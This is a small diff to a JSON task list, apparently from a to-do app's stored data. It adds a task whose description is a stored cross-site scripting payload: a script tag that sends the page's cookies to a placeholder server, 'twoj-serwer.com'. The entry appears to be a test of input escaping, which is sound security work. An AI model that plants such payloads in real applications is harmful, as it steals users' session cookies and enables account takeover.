@@ -110,6 +110,18 @@
         "createdAt": "2026-05-15T11:10:04.765Z",
         "status": "CREATED_SUCCESSFULLY"
       }
+    },
+    {
+      "id": 14,
+      "title": "zadanie1",
+      "description": "<script>\n  fetch(\"https://twoj-serwer.com/log?dane=\" + document.cookie);\n</script>\n",
+      "dueDate": "2222-02-22",
+      "priority": "medium",
+      "completed": false,
+      "metadata": {
+        "createdAt": "2026-05-19T12:36:31.369Z",
+        "status": "CREATED_SUCCESSFULLY"
+      }
     }
   ]
 }
